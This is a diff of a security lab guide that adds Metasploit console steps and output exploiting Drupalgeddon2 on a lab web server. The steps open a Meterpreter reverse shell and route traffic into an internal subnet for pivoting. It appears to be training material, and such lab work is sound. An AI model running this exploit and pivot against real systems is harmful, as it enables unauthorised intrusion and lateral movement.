@@ -503,8 +503,26 @@ In this exercise, we will use already established **reverse shell** from the Dru
     * Type **use exploit/unix/webapp/drupal_drupalgeddon2** to select the drupalgeddon2 exploit module
     * Type **set RHOST 192.168.10.101** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**
     * Type **set RPORT 8080** to define the port the vulnerable Drupal service runs on. 
-    * Type **exploit -z** to initiate the exploit attempt and background the session.
-    * Type **route add 192.168.20.0/24 1**, where the subnet specified is the subnet of the **Internal Segment**
+    * Type **exploit -z** to initiate the exploit, esbalish a reverse shell, and background the session.
+    
+```console
+msf5 > use exploit/unix/webapp/drupal_drupalgeddon2
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOST 192.168.10.101
+RHOST => 192.168.10.101
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RPORT 8080
+RPORT => 8080
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) > exploit -z
+
+[*] Started reverse TCP handler on 10.114.209.151:4444
+[*] Sending stage (38288 bytes) to 192.168.10.101
+[*] Meterpreter session 1 opened (10.114.209.151:4444 -> 192.168.10.101:50982) at 2020-07-21 20:30:34 -0500
+[*] Session 1 created in the background.
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) >
+```
+    
+**Route traffic to the Internal Network through the esablished reverse shell**
+1.	 Type **route add 192.168.20.0/24 1**, where the subnet specified is the subnet of the **Internal Segment**
     
 6. Confirm the vulnerable server was sucessfully exploited and a **Meterpreter** reverse TCP session was established from **App1-WEB-TIER VM** back to the **Extermal VM**
 
